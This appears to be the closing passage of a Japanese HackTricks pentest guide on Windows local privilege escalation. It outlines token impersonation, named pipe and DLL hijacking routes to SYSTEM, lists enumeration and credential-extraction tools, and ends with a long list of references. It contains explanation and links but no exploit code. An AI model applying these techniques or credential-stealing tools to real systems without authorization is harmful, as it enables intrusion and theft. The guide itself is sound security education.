**コードは**[**こちらにあります**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらのtoken privilegesを持っている場合（おそらく、すでにHigh Integrityで実行されているプロセスで見つかります）、SeDebug privilegeを使って（protected processesを除く）**ほぼすべてのプロセスを開き**、そのプロセスのtokenを**コピー**して、そのtokenで**任意のプロセスを作成**できます。\
通常、この手法では、すべてのtoken privilegesを持つSYSTEM実行中のプロセスを**選択します**（_はい、すべてのtoken privilegesを持たないSYSTEMプロセスも見つかります_）。\
**提案した手法を実行するコード例は**[**こちらにあります**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この手法は、meterpreterが`getsystem`で昇格する際に使用します。**pipeを作成し、そのpipeに書き込むserviceを作成または悪用する**手法です。その後、**`SeImpersonate`** privilegeを使ってpipeを作成した**server**は、pipe client（service）のtokenを**偽装**し、SYSTEM privilegesを取得できます。\
[**name pipesについて詳しく知りたい場合はこちらをお読みください**](#named-pipe-client-impersonation)。\
[name pipesを使ってhigh integrityからSystemに移行する方法の](from-high-integrity-to-system-with-name-pipes.md)[**例はこちらをお読みください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM**として実行されている**プロセス**によって**ロード**されるdllを**hijack**できれば、その権限で任意のコードを実行できます。そのため、Dll Hijackingはこの種のprivilege escalationにも有効です。さらに、high integrityプロセスからはdllのロードに使われるフォルダへの**書き込み権限**があるため、はるかに**簡単に実行できます**。\
**Dll hijackingについて詳しくは**[**こちらを参照してください**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalationのベクトルを探すのに最適なtool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurationsとsensitive filesをチェックします (**[**こちらを参照**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 考えられるmisconfigurationsをチェックし、情報を収集します (**[**こちらを参照**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurationsをチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDPの保存済みsession情報を抽出します。ローカルでは-Thoroughを使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Managerからcredentialsを抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したpasswordをdomain全体にsprayします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- InveighはPowerShell製のADIDNS/LLMNR/mDNS spoofer兼man-in-the-middle toolです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windowsの基本的なprivesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc vulnerabilitiesを検索します（Watsonにより非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **（Admin rightsが必要）**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc vulnerabilitiesを検索します（VisualStudioでcompileする必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurationsを探してhostをenumerateします（privescというより情報収集toolです）（compileが必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのsoftwareからcredentialsを抽出します（githubにprecompiled exeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfigurationをチェックします（githubにprecompiled executableがあります）。推奨しません。Win10ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 考えられるmisconfigurationsをチェックします（python製のexe）。推奨しません。Win10ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたtoolです（正しく動作するためにaccesschkは不要ですが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルのpython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルのPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しいバージョンの.NETを使ってプロジェクトをcompileしてください（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim hostにインストールされている.NETのバージョンを確認するには、次のコマンドを実行します:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows Privilege Escalation の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [フォルダーのアクセス許可の不備を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT が新たな定番 (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - OSCP 完全ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation ガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester 向け Windows Privilege Escalation 手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP 経由の Word VBA マクロ phishing → hMailServer の認証情報を復号 → Veeam CVE-2023-27532 で SYSTEM 権限を取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) と kernel token の窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox を追う: Kernel の影で繰り広げられるいたちごっこ](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA システムに存在する権限ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link テストツール – CreateSymlink の使い方](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: Windows の Symbolic Link の悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF 移植版)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windows における危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js モジュール: `node_modules` フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ チェックリストの課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues 関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop での Pwn2Own: CLDFLT と DirectX Kernel の race condition を連鎖させた Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する 1 つの I/O Ring: Windows 11 における完全な読み書き exploit primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用した権限昇格とその他の優れたテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013、Windows 10 の Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager と Windows Vault を探る](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: イメージの変更が権限昇格につながるケース](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh Agent からの SSH 秘密鍵の抽出](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – 企業のアップデートサーバーをバックドア工場に変える (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – 企業のアップデートサーバーをバックドア工場に変える (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Microsoft Windows Installer フォルダーの削除による権限昇格](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
